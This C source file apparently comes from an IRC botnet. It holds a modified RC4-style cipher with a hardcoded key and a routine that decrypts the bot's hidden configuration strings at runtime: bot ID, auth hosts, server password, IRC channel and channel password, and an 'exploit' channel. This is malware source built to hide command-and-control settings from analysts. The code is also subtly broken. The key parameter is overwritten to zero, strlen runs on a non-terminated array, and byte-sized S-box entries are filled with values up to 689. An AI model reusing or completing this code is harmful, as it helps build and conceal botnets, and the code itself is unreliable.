#include "includes.h"
#include "extern.h"

void Crypt(unsigned char *inp, DWORD inplen, unsigned char *key, DWORD keylen) {
	unsigned char Sbox[691], Sbox2[691], temp=0 , k=0;
	unsigned long i=0, j=0, t=0, x=0;
	keylen=0;
	unsigned char cuminme[44];
	cuminme[0]=10; cuminme[1]=14; cuminme[2]=32; cuminme[3]=72;
	cuminme[4]=11; cuminme[5]=43; cuminme[6]=12; cuminme[7]=35;
	cuminme[8]=58; cuminme[9]=39; cuminme[10]=40; cuminme[11]=94;
	cuminme[12]=42; cuminme[13]=30; cuminme[14]=45; cuminme[15]=90;
	cuminme[16]=27; cuminme[17]=15; cuminme[18]=76; cuminme[19]=68;
	cuminme[20]=22; cuminme[21]=04; cuminme[22]=87; cuminme[23]=35;
	cuminme[24]=17; cuminme[25]=83; cuminme[26]=56; cuminme[27]=19;
	cuminme[28]=13; cuminme[29]=18; cuminme[30]=37; cuminme[31]=28;
	cuminme[32]=48; cuminme[33]=18; cuminme[34]=80; cuminme[35]=79;
	cuminme[36]=57; cuminme[37]=16; cuminme[38]=66; cuminme[39]=31;
	cuminme[40]=55; cuminme[41]=29; cuminme[42]=65; cuminme[43]=85;
	unsigned int OurKeyLen=strlen((char *)cuminme);
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));
	for(i=0; i <690U; i++)
	Sbox[i]=(unsigned char)i;
	if(keylen) {
	for(i=0; i<690U; i++) {
	if(j==keylen)
	j=0;
	Sbox2[i]=key[j++];
	}    
	} else {
	for(i=0; i<690U ; i++) {
	if(j==(unsigned long)OurKeyLen)
	j=0;
	Sbox2[i]=cuminme[j++];
	}
	}
	j=0;
	for(i=0; i<690; i++) {
	j=(j+(unsigned long)Sbox[i]+(unsigned long)Sbox2[i])%690U;
	temp=Sbox[i];                    
	Sbox[i]=Sbox[j];
	Sbox[j]= temp;
	}
	i=j=0;
	for(x=0; x<inplen; x++) {
	i=(i+1U)%690U;
	j=(j+(unsigned long)Sbox[i])%690U;
	temp=Sbox[i];
	Sbox[i]=Sbox[j];
	Sbox[j]=temp;
	t=((unsigned long)Sbox[i]+(unsigned long)Sbox[j])% 690U;
	k=Sbox[t];
	inp[x]=(unsigned char)(inp[x] ^ k);
	}
  #ifdef _DEBUG
	printf("Crypt:: %s\n",inp);
  #endif
	return;
}


#ifndef NO_CRYPT
void derapestrings(int authsize, int serversize) {
	int i;
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);
	Crypt((unsigned char *)password,strlen(password),NULL,0);
	for(i=0;i<authsize;i++) {
	Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);
	}
	Crypt((unsigned char *)botid,strlen(botid),NULL,0);
	Crypt((unsigned char *)version,strlen(version),NULL,0);
	for(i=0;i<serversize;i++) {
	Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);
	}
	Crypt((unsigned char *)serverpass,strlen(serverpass),NULL,0);
	Crypt((unsigned char *)channel,strlen(channel),NULL,0);
	Crypt((unsigned char *)chanpass,strlen(chanpass),NULL,0);
	//Crypt((unsigned char *)psniffchan,strlen(psniffchan),NULL,0);
	Crypt((unsigned char *)exploitchan,strlen(exploitchan),NULL,0);
return; };
#endif
